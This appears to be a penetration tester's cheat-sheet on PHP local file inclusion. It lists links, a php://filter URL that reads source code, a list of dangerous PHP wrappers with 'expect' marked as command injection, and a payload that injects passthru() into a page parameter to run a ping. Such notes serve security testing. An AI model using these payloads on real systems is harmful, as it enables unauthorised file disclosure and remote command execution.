#

https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601

## php filter

https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/

```
http://example.com/?m=php://filter/convert.base64-encode/resource=index
```

## wrappers

see php wrappers

dangerous : 

- data
- php
- file, http, ftp
- expect <-- cmd injection

https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf

## evasion

https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work

## dumb things

Sometimes, some this work : 

```
/index.php?page=about'.passthru('ping%20-c%203%20192.168.49.160').'
```


https://blog.clever-age.com/fr/2014/10/21/owasp-local-remote-file-inclusion-lfi-rfi/

